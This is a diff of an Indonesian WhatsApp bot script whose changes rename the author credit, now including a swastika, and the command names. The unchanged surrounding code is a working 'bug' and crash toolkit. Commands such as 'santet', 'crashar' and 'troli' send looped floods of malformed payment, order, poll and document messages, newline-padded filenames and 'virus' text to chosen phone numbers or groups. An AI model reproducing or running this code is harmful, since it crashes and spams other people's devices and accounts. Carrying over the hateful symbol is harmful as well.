@@ -2,13 +2,13 @@
 // Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
    Apalagi Lari Dari Tanggung Jawab
 
-// Base © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ Hw Mods : Copyan Dari Base Dika
+// Base © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ Hw Mods : Copyan Dari Base Dika
 
-› Create By © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢
-› Base Ori © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢
+› Create By © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢
+› Base Ori © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢
 › Copyan Base Dika Hisoka Morou
 
-🌷 KALAU MAU RENAME TARO CREDITS GUA : © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ */
+🌷 KALAU MAU RENAME TARO CREDITS GUA : © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ */
 
 //=================================================//
 require('./hwkal')
@@ -135,7 +135,7 @@ const deploy = (teks) => {
   haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
 //=================================================//
 const reply = (teks) => {
-return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m })} 
+return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m })} 
 //=================================================//
 try {
 let isNumber = x => typeof x === 'number' && !isNaN(x)
@@ -379,7 +379,7 @@ haikal.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.
 }
 }
 break
-case 'jadikatalog': case 'dikzxkatalog': {
+case 'jadikatalog': case 'zaffkatalog': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!quoted) throw 'Reply Image/sticker'
@@ -567,7 +567,7 @@ if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
 let teks = `${q}`
 for (let i of teks) {
-haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -622,7 +622,7 @@ haikal.sendMessage(m.chat, buttonnnnmMessage)
 //=================================================//
 //=================================================//
 //=================================================//
-case 'inibug': case 'dikzxjhon': {
+case 'inibug': case 'zaffjhon': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -638,7 +638,7 @@ haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }
 }
 break
 //=================================================//
-case 'dikzxpoll': case 'dikzxjhon2': {
+case 'zaffpoll': case 'zaffjhon2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -647,7 +647,7 @@ ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
-"name": "HALO 👋 SAYA BOT © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢",
+"name": "HALO 👋 SAYA BOT © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢",
 "options": [
 {
 "optionName": "KATANYA WA KEBAL"
@@ -662,7 +662,7 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "optionName": "KATANYA KEBAL"
 },
 {
-"optionName": "SALAM BROTHER BY © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢"
+"optionName": "SALAM BROTHER BY © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢"
 }
 ],
 "selectableOptionsCount": 5
@@ -673,7 +673,7 @@ deploy('sukses sendbug')}
 }
 break
 //=================================================//
-case 'dikzxtroli2': case 'dikzxtrol': case 'jutrol': {
+case 'zafftroli2': case 'zafftrol': case 'jutrol': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return reply(`Jumlahnya?`)
@@ -688,7 +688,7 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "itemCount": 1999,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": " BY © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ",
+"message": " BY © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ",
 "orderTitle": " BUG TROLI ", // 
 "sellerJid": "6281214281312@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
@@ -698,7 +698,7 @@ haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
 }
 }
 break
-case 'dikzxtroli3': case 'dikzxtrol2': {
+case 'zafftroli3': case 'zafftrol2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return reply(`Jumlahnya?`)
@@ -709,7 +709,7 @@ function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824'
 }
 break
 //=================================================//
-case 'dikzxsantet': {
+case 'zaffsantet': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
@@ -722,7 +722,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,
+"text": `MY DEVELOPER © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,
 }
 }}), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -731,7 +731,7 @@ m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
 break
 //=================================================//
-case 'dikzxsantetgc': {
+case 'zaffsantetgc': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
@@ -745,7 +745,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,
+"text": `MY DEVELOPER © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,
 }
 }}), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -754,7 +754,7 @@ m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
 break
 //=================================================//
-case 'ducu': case 'dikzxducu': {
+case 'ducu': case 'zaffducu': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -762,12 +762,12 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
 yy = fs.readFileSync('./baseikal/sound/hwmods.HW')
-haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
+haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
 }
 }
 break
 //=================================================//
-case 'dikzxdaca': case 'dikzxdaca':  {
+case 'zaffdaca': case 'zaffdaca':  {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -775,12 +775,12 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
  ilih = fs.readFileSync('./baseikal/sound/hwmods.HW')
- haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
+ haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
  }
  }
  break
 //=================================================//
-case 'dikzxdocu': case 'dikzxdraknes':  {
+case 'zaffdocu': case 'zaffdraknes':  {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -806,7 +806,7 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 //=================================================//
-case 'duc': case 'dikzxslebew': case 'cumadocu': {
+case 'duc': case 'zaffslebew': case 'cumadocu': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -821,7 +821,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
 "pageCount": 0,
 "mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
-"fileName": `🔥 © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
+"fileName": `🔥 © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
 "fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
 "directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
 "mediaKeyTimestamp": "1659416157",
@@ -832,108 +832,108 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 //=================================================//
-case 'dikzxvirtext1': case 'dikzxzsu': case 'crashar1': {
+case 'zaffvirtext1': case 'zaffzsu': case 'crashar1': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ${iphone}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ${iphone}` }, { quoted: doc })
 }
 }
 break
-case 'dikzxvirtext2': case 'dikzxtol': case 'crashar2': {
+case 'zaffvirtext2': case 'zafftol': case 'crashar2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ${iphone1}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ${iphone1}` }, { quoted: doc })
 }
 }
 break
-case 'dikzxvirtext3': case 'dikzxmemek': case 'crashar3': {
+case 'zaffvirtext3': case 'zaffmemek': case 'crashar3': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ${iphone2}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ${iphone2}` }, { quoted: doc })
 }
 }
 break
-case 'dikzxvirtext4': case 'dikzxcontol': case 'crashar4': {
+case 'zaffvirtext4': case 'zaffcontol': case 'crashar4': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ${iphone3}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ${iphone3}` }, { quoted: doc })
 }
 }
 break
-case 'dikzxvirtext5': case 'dikzxtextv': case 'crashar5': {
+case 'zaffvirtext5': case 'zafftextv': case 'crashar5': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ${iphone4}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ${iphone4}` }, { quoted: doc })
 }
 }
 break
-case 'dikzxvirtext6': case 'dikzxgas': case 'crashar6':{
+case 'zaffvirtext6': case 'zaffgas': case 'crashar6':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ${iphone5}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ${iphone5}` }, { quoted: doc })
 }
 }
 break
-case 'dikzxvirtext7': case 'dikzxvirtext': {
+case 'zaffvirtext7': case 'zaffvirtext': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ${iphone6}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ${iphone6}` }, { quoted: doc })
 }
 }
 break
-case 'dikzxvirtext8': case 'dikzxvirtext1': case 'crashar7':{
+case 'zaffvirtext8': case 'zaffvirtext1': case 'crashar7':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ${buttonkal}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ${buttonkal}` }, { quoted: doc })
 }
 }
 break
-case 'dikzxvirtext9': case 'dikzxvirtext2': case 'crashar8':{
+case 'zaffvirtext9': case 'zaffvirtext2': case 'crashar8':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ${buttonvirus}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ${buttonvirus}` }, { quoted: doc })
 }
 }
 break
-case 'dikzxvirtext10': case 'dikzxvirtext3': case 'crashar9': {
+case 'zaffvirtext10': case 'zaffvirtext3': case 'crashar9': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ${ngazap(prefix)}`}, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ${ngazap(prefix)}`}, { quoted: doc })
 }
 }
 break
 //=================================================//
-case 'dikzxbug1': case 'dikzxcrash': case 'crashar10':{
+case 'zaffbug1': case 'zaffcrash': case 'crashar10':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -959,7 +959,7 @@ haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
 }
 break
 //=================================================//
-case 'dikzxbug2': case 'dikzxcrash1': case 'crashar11': {
+case 'zaffbug2': case 'zaffcrash1': case 'crashar11': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -971,7 +971,7 @@ var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "imageMessage": {
 "url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
 "mimetype": "image/jpeg",
-"caption": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
+"caption": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
 "fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
 "fileLength": "42521",
 "height": 426,
@@ -988,7 +988,7 @@ haikal.relayMessage(m.chat, image.message, { messageId: image.key.id })
 }
 break
 //=================================================//
-case 'dikzxbug3': case 'dikzxcrash2': case 'crashar12': {
+case 'zaffbug3': case 'zaffcrash2': case 'crashar12': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1004,7 +1004,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
